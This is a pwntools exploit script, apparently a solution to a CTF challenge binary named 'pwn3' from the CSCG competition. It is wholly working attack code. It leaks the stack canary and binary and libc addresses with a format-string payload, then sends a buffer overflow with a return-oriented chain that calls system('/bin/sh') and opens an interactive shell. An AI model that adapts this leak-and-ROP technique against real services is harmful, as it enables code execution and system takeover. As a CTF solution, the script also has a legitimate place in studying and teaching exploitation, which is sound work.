from pwn import *

p = process("./pwn3")

p.recvuntil(b"Enter the password of stage 2:\n")
p.sendline(b"CSCG{THIS_IS_TEST_FLAG}")

p.recvuntil(b"Enter your witch name:")
formatString = b"%p|" * 41 # send format string payload

p.sendline(formatString)

leaks = p.recvuntil(b"enter your magic spell:").decode().split("|")

# Set Leaks
binary = int(leaks[-2], 16)
main = binary - 0x37
ret = main + 0x43
canary = int(leaks[-4], 16)
leaked_libc = int(leaks[2], 16)

# calc address ( u can know offsets using gdb in ur local machine)
binary_base = binary - 0xdc5
libc_base =  leaked_libc - 0xeca37
system = libc_base + 0x28d60
pop_rdi = main + 0xac
sh = (libc_base-0x28000) + 0x1d8698

log.info(f"Leaks: {leaks}")
log.info(f"Binary: {hex(binary)}")
log.info(f"binary base: {hex(binary_base)}")
log.info(f"Main: {hex(main)}")
log.info(f"Canary: {hex(canary)}")
log.info(f"Libc Address: {hex(leaked_libc)}")
log.info(f"libc base: {hex(libc_base)}")
log.info(f"System : {hex(system)}")
log.info(f"sh : {hex(sh)}")

payload  = b"Expelliarmus\x00" + b"A" * 251
payload += p64(canary)
payload += b"A"*8
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(ret)
payload += p64(system)

# raw_input("gdb")
p.sendline(payload)

p.interactive()
